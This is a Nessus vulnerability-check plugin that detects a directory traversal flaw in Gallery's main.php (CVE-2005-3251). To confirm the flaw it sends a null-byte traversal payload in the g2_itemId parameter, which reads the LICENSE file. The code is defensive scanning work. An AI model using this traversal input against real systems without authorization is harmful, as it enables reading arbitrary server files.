#
# (C) Tenable Network Security, Inc.
# 



include("compat.inc");

if (description) {
  script_id(20015);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-3251");
  script_bugtraq_id(15108);
  script_xref(name:"OSVDB", value:"20017");

  script_name(english:"Gallery main.php g2_itemId Variable Traversal Arbitrary File Access");
  script_summary(english:"Checks for g2_itemId parameter Directory Traversal vulnerability in Gallery");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
directory traversal flaw." );
 script_set_attribute(attribute:"description", value:
"The version of Gallery installed on the remote host fails to sanitize
user-supplied input to the 'g2_itemId' parameter of the 'main.php'
script before using it to read cached files.  If PHP's
'display_errors' setting is enabled, an attacker can exploit this flaw
to read arbitrary files on the remote host, subject to the privileges
of the web user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/413405" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Gallery 2.0.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/gallery", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read the LICENSE file included in the distribution.
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/main.php?",
      "g2_itemId=../../../../../LICENSE%00"
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if we get an error involving requireonce
  if (
    "</b>:  requireonce(" >< res &&
    "/modules/core/classes/../../../               GNU GENERAL PUBLIC LICENSE" >< res
  ) {
    if (report_verbosity > 0) {
      report = string(
        "\n",
        res
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
